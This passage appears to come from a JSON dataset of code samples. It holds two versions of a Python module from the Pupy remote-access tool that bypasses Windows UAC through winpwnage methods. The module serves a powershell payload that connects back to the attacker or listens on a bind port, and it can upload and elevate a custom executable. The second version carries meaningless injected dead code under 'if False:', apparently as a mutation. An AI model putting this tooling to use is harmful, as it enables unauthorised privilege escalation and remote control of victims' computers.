['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmd = self.client.desc['exec_path']\n    if not args.restart and local_file:\n        self.info('Uploading to %s' % remote_file)\n        upload(self.client.conn, local_file, remote_file, chunk_size=1 * 1024 * 1024)\n    self.info('Bypass uac could take few seconds, be patient...')\n    bypass_uac = self.client.remote('winpwnage.core.scanner', 'function', False)\n    result = bypass_uac(uac=True, persist=False).run(id=method, payload=cmd)\n    if not result:\n        self.error('Nothing done, check if the id is on the list')\n    else:\n        self.parse_result(result, get_method_id=False)\n    if completion:\n        if not completion.is_set():\n            self.info('Waiting for a powerloader status updates')\n            completion.wait()\n    elif not args.exe and (not args.restart):\n        self.info('Waiting for a connection (take few seconds, 1 min max)...')\n    if not args.exe and (not args.restart) and local_file:\n        os.remove(local_file)",
            "def run(self, args):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    can_get_admin_access = self.client.remote('pupwinutils.security', 'can_get_admin_access', False)\n    if not can_get_admin_access():\n        self.error('Your are not on the local administrator group.')\n        return\n    if args.scan:\n        self.launch_scan()\n        return\n    if not args.scan and (not args.method):\n        method = self.launch_scan(print_result=False)\n        if not method:\n            self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')\n            return\n    else:\n        method = args.method\n    if method in ('11', '12', '13', '14'):\n        self.warning('This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts')\n        return\n    if method in '07':\n        self.warning('This technique does not work with custom exe, only work with cmd.exe')\n        return\n    is_bind_launcher = False\n    (launcher_type, address_port) = (self.client.desc['launcher'], self.client.desc['address'])\n    if launcher_type == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(address_port))\n        is_bind_launcher = True\n    rjoin = self.client.remote('os.path', 'join')\n    risfile = self.client.remote('os.path', 'isfile')\n    tempdir = self.client.remote('tempfile', 'gettempdir', False)\n    random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])\n    local_file = ''\n    remote_file = ''\n    completion = None\n    if not args.exe and (not args.restart):\n        self.info('Using powershell payload')\n        client_conf = None\n        if is_bind_launcher:\n            self.info('BIND launcher is on the target.')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listening_port = -1\n            while listening_port == -1:\n                try:\n                    listening_port = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again ({})'.format(e))\n            listening_address = address_port.split(':')[0]\n            bind_address_and_port = '{0}:{1}'.format(listening_address, listening_port)\n            self.info('Payload used for bypassing UAC will be configured for listening on {0} on the target'.format(bind_address_and_port))\n            bind_conf = self.client.get_conf()\n            bind_conf['launcher_args'][bind_conf['launcher_args'].index('--port') + 1] = str(listening_port)\n            client_conf = bind_conf\n        else:\n            self.info('Reverse connection mode: Configuring client with the same configuration as the (parent) launcher on the target')\n            client_conf = self.client.get_conf()\n        (cmd, completion) = powerloader.serve(self, client_conf)\n    elif args.exe:\n        cmd_args = shlex.split(args.exe, posix=False)\n        (arg0, argv) = (cmd_args[0], cmd_args[1:])\n        argv = ' '.join((repr(x) if ' ' in x else x for x in argv))\n        if risfile(arg0):\n            self.info('Using remote cmd ({})'.format(args.exe))\n            cmd = args.exe\n        elif os.path.exists(arg0):\n            self.info('Using custom executable (local)')\n            local_file = args.exe\n            remoteFileName = '{random_name}.{ext}'.format(random_name=random_name, ext='exe')\n            remote_file = rjoin(tempdir(), remoteFileName)\n            cmd = remote_file + ' ' + argv\n        else:\n            self.error('Executable file not found: {}'.format(arg0))\n            return\n    else:\n        self.info('Using current executable')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmd = self.client.desc['exec_path']\n    if not args.restart and local_file:\n        self.info('Uploading to %s' % remote_file)\n        upload(self.client.conn, local_file, remote_file, chunk_size=1 * 1024 * 1024)\n    self.info('Bypass uac could take few seconds, be patient...')\n    bypass_uac = self.client.remote('winpwnage.core.scanner', 'function', False)\n    result = bypass_uac(uac=True, persist=False).run(id=method, payload=cmd)\n    if not result:\n        self.error('Nothing done, check if the id is on the list')\n    else:\n        self.parse_result(result, get_method_id=False)\n    if completion:\n        if not completion.is_set():\n            self.info('Waiting for a powerloader status updates')\n            completion.wait()\n    elif not args.exe and (not args.restart):\n        self.info('Waiting for a connection (take few seconds, 1 min max)...')\n    if not args.exe and (not args.restart) and local_file:\n        os.remove(local_file)"
        ]
    }
]